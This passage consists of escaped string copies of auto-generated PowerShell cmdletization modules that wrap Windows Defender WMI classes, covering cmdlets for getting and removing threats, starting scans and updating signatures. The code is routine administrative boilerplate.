[Parameter(ParameterSetName='Remove0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Remove0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Remove0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-MpThreat' -Alias '*'\r\n        \r\n\r\nfunction Get-MpThreat\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreat')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('ID')]\r\n    [ValidateNotNull()]\r\n    [long[]]\r\n    ${ThreatID},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ThreatID})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreat' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatCatalog'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-MpThreatCatalog\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatCatalog')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('ID')]\r\n    [ValidateNotNull()]\r\n    [long[]]\r\n    ${ThreatID},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ThreatID})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreatCatalog.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreatCatalog' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatDetection'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-MpThreatDetection\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatDetection')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('ID')]\r\n    [ValidateNotNull()]\r\n    [long[]]\r\n    ${ThreatID},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ThreatID})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreatDetection.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreatDetection' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpScan'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Start-MpScan\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${ScanPath},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('FullScan','QuickScan','CustomScan')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType]\r\n    ${ScanType},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Start0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanPath')) {\r\n          [object]$__cmdletization_value = ${ScanPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanType')) {\r\n          [object]$__cmdletization_value = ${ScanType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpScan.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-MpScan' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpSignature'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Update-MpSignature\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Update0')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource]\r\n    ${UpdateSource},\r\n\r\n    [Parameter(ParameterSetName='Update0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Update0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Update0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UpdateSource')) {\r\n          [object]$__cmdletization_value = ${UpdateSource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Update', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpSignature.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Update-MpSignature' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpWDOScan'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Start-MpWDOScan\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    